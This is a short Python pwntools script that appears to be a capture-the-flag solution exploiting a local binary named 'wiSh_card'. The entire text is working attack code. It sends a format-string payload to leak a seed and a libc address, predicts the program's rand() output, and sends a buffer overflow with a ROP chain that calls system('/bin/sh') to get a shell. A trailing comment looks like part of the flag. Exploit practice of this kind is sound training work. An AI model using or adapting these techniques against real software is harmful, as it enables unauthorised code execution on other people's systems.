from pwn import *
from ctypes import CDLL

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#r = gdb.debug("./wiSh_card", gdbscript = "disas write_wish")
r = process("./wiSh_card")

r.sendlineafter(b'> ', b'2')

syslog_exploit_payload = b'%21$p %24$p'
r.sendlineafter(b'recipient: ', syslog_exploit_payload)

r.recvuntil(b'Username: ')

seed_leak = int(r.recvuntil(b' ').decode()[:-1], 16) >> 32
log.info(f"Seed leaked: {hex(seed_leak)}")

libc_seed = CDLL("libc.so.6")
libc_seed.srand(seed_leak)

libc_leak = int(r.recvline().strip().decode(), 16)

libc.address = libc_leak - 0x29D68
log.info(f"Libc address: {hex(libc.address)}")

r.sendlineafter(b'[Y/n] ', b'y')

rand_number = libc_seed.rand()
r.sendlineafter(b'number: ', str(rand_number).encode())

pop_rdi = p64(libc.address + 0x2a205)
ret = p64(libc.address + 0x28635)
payload = b'A' * 32 + b'\x03' * 24 + ret + pop_rdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym[b"system"])

r.sendlineafter(b'wish: ', payload)

r.interactive()

#N0_Sp3c14l_Ch4r
